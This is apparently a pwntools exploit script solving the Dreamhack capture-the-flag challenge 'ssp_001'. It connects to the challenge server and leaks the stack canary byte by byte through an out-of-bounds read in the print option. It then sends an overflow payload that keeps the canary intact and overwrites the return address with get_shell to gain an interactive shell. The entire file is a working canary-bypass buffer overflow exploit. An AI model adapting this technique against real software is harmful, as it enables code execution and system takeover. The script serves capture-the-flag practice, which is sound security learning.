#!/usr/bin/env python3

from pwn import *

exe = ELF("./ssp_001", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("host1.dreamhack.games", 20368)

    return p

def main():
    p = conn()

    # Print
    def print_func(idx):
        p.sendafter(b'> ', b'P')
        p.sendlineafter(b'index : ', str(idx).encode())

    # Exit
    def exit_func(data):
        p.sendafter(b'> ', b'E')
        p.sendlineafter(b'Size : ', str(len(data)).encode())
        p.sendafter(b'Name : ', data)

    input()

    lst = [0] # byte null of canary

    # Leak canary + Out-of-bounds
    for i in range(3):
        print_func(0x80 + i + 1)
        p.recvuntil(b'is : ')
        byte = int(p.recv(2), 16)
        print(f"Part {i + 1}: " + hex(byte))
        lst.append(byte)

    canary = b''
    for b in lst:
        canary += p8(b)
    canary = u32(canary)

    # canary = u32(b''.join([p8(b) for b in canary]))
    print("Canary: " + hex(canary))

    payload = b'a'*64 + p32(canary) + b'a'*8 + p32(exe.sym['get_shell'])
    exit_func(payload)

    p.interactive()

if __name__ == "__main__":
    main()